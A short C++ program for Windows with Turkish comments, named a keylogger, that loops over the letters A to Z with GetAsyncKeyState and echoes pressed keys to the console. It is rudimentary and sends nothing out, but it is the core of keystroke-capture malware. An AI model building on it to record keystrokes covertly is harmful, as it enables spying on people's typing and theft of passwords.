#include <iostream>
#include <windows.h>
#include <clocale>

using namespace std;


void Keylogger();

int main()
{
  setlocale(LC_ALL, "Turkish"); // Konsolu Türkçe karakterlere uyumlu hale getirir. debug için faydalı
  
  Keylogger();
}

void Keylogger()
{
    while (true)
    {
	    for (char key = 'A'; key <= 'Z'; key++)
	    {
		    if (GetAsyncKeyState(key) & 0x8000)
		    {
	    		cout << key;
    
		    }

  	  }
  	  Sleep(100); //Sleep = Programın çalışmasını belirli bir süre durdurur. 100 = 100 milisaniye
    }
}
